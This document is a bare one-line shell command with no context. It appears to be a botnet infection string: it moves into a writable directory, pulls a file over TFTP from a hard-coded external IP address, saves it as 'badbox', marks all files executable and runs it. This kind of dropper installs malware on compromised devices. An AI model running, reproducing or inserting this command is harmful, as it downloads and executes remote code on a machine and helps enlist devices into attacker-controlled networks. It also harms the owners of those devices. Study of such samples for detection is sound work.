cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.165.103 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
